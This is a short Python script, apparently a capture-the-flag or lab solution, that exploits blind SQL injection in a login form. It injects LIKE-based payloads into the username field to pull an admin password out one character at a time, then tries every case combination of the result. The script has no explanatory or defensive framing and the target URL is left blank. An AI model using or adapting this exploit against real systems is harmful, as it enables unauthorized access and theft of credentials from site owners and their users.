import requests
import string
import sys
import time
import itertools

def bruteforce():
    payload = "admin'+and+password+like+'%'--"
    charset = string.ascii_letters + string.digits

    found = False
    passw = ""
    while (found != True):
        for char in charset:
            payload2 = "admin' and password like '{}%' --".format(passw + char)
            param = {"username":payload2, "password":"password"}
            print("[*] Using Payload {}".format(param))
            r = requests.post("", data=param)
            print(r.text)
            if "Welcome back admin !" in r.text:
                passw += char
                print("[*] Found char {} : passw {}".format(char, passw))
                break
        print("[*] Trying to remove wildcard for passw = {}".format(passw))
        param = {"username":"admin' and password like '{}'--".format(passw), "password":"password"}
        r = requests.post("", data=param)
        print(r.text)
        if "SUCCESS_MESSG" in r.text:
            print("[*] Testing combination of : {} cause like is case insensitive".format(passw))
            combination = map(''.join, itertools.product(*zip(passw.upper(), passw.lower())))
            for comb_pass in combination:
                print("[*] Trying the password : {}".format(comb_pass))
                param = {"username":"admin", "password":comb_pass}
                r = requests.post("", data=param)
                if "SUCCESS_MESSG" in r.text:
                    print("[*] Password is = |{}| ! GG".format(comb_pass))
                    sys.exit(1)

bruteforce()
